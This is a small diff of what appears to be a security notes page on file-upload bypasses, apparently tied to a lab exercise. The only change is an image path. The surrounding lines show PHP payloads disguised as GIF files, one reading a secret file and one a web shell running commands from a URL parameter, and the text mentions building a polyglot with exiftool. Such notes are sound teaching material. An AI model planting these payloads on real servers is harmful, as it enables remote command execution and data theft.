@@ -95,7 +95,7 @@ GIF89a;<?php echo file_get_contents('/home/carlos/secret'); ?>
 GIF89a;<?php system($_GET['cmd']); ?>
 ```
 
-![PHP file disguised as an GIF file](<../../../.gitbook/assets/image (6) (1) (1).png>)
+![PHP file disguised as an GIF file](<../../../.gitbook/assets/image (6) (1) (1) (1).png>)
 
 or, Generate a polyglot payload using **exiftool :**
 
